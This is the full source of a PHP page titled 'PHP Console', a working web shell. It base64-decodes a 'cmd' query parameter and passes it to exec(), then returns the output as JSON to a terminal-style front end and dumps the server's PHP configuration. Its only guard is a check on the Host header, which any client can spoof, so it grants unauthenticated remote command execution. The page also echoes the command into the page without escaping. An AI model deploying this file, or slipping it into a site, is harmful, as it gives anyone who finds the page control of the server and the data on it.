<?php

$output = [];
$result_code = 0;

if (array_key_exists('cmd', $_GET))
{
    $headers = apache_request_headers();
    $host = '';

    if (array_key_exists("Host", $headers))
        $host = $headers['Host'];

    $command = trim(base64_decode($_GET['cmd']));

    if ($host === $_SERVER['SERVER_NAME'])
        @exec($command, $output, $result_code);

    $response = [
        'host'          => $host,
        'command'       => $command,
        'output'        => $output,
        'result_code'   => $result_code,
    ];

    echo json_encode($response);

    return;
}

function getPS1() : string
{
    global $output;
    global $result_code;

    $command = 'whoami';
    $whoami = (string)@exec($command, $output, $result_code);

    $command = 'id -g -n';
    $group = (string)@exec($command, $output, $result_code);

    $command = 'pwd';
    $pwd = (string)@exec($command, $output, $result_code);

    $PS1 = '[' . $whoami . ':' .  $group . '@' . $_SERVER['SERVER_NAME'] . ' ' . $pwd . ']$';

    return $PS1;
}

$phpinfo = [];
@exec('php -i', $phpinfo);

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>PHP Console <?php echo '@' . $_SERVER['SERVER_NAME']; ?></title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAQAAEABAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAiIiIAVVVVAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEBEBAAAAAAAQEQEAAAAAARARARAAAAABEBEBEAAAABERERERAAABEREREREQAAEQERERARAAARABERABEAAREAARAAERABEREREREREAEREREREREQABEREAEREQAAABEREREAAAAAABERAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
    <style>
        *,
        *::before,
        *::after {
            box-sizing: border-box;
        }
        body {
            background-color: #000;
            color: #cc0;
            font-family: monospace;
            font-size: 16px;
            margin: 0;
            min-height: 100vh;
            scroll-behavior: smooth;
            text-rendering: optimizeSpeed;
            line-height: 1.5;
        }
        h1,
        h2 {
            margin: 0 0 1.5rem 0;
            font-size: 1.75rem;
            font-weight: 700;
        }
        h2 {
            margin-bottom: .5rem;
            font-size: 1rem;
        }
        form,
        textarea {
            width: 100%;
        }
        .container {
            margin-left: auto;
            margin-right: auto;
            max-width: 992px;
            padding-left: 24px;
            padding-right: 24px;
        }
        #commands,
        pre {
            background-color: #444;
            color: #ddd;
            margin: 0 0 1rem 0;
            padding: .75rem 1.25rem;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>PHP Console</h1>
        <form id="mainform">
            <label for="commands"><?php echo getPS1(); ?></label>
            <textarea id="commands" name="commands"></textarea>
        </form>
        <h2>command:</h2>
        <pre id="lastcommand"></pre>
        <h2>result_code:</h2>
        <pre id="result_code"></pre>
        <h2>output:</h2>
        <pre id="output"></pre>
        <h2>phpinfo():</h2>
        <pre><?php echo implode(PHP_EOL, $phpinfo); ?><pre>
    </div>
<script>
"use strict";

(function (D, W)
{
    var commandElem = D.getElementById("commands"),
        form        = D.getElementById("mainform"),
        lastCmdElem = D.getElementById("lastcommand"),
        outElem     = D.getElementById("output"),
        resElem     = D.getElementById("result_code");

    function sendCommand()
    {
        var cmd     = commandElem.value,
            request = new XMLHttpRequest();

        request.open("GET", "pcl.php?cmd=" + btoa(cmd), true);
        request.responseType = "json";

        request.onload = function()
        {
            if (this.status === 200)
            {
                console.log(this.response);

                lastCmdElem.innerHTML = this.response.command;

                outElem.innerHTML = "";

                this.response.output.forEach(
                    function (elem, index)
                    {
                        outElem.innerHTML += elem.replace(/[\u00A0-\u9999<>\&]/g, i => '&#'+i.charCodeAt(0)+';') + '\n';
                    }
                );

                resElem.innerHTML = this.response.result_code;
            }
            else
            {
                console.log("Request failed.");
            }
        }

        request.onerror = function()
        {
            console.log("Request failed.");
        }

        request.send();

        commandElem.value = "";
    }

    form.addEventListener(
        "submit",
        function (e)
        {
            e.preventDefault();
        }
    );

    commandElem.addEventListener(
        "keyup",
        function (e)
        {
            if (e.code === 'Enter' && !e.shiftKey)
                sendCommand();
        }
    );
})
(document, window);
</script>
</body>
</html>
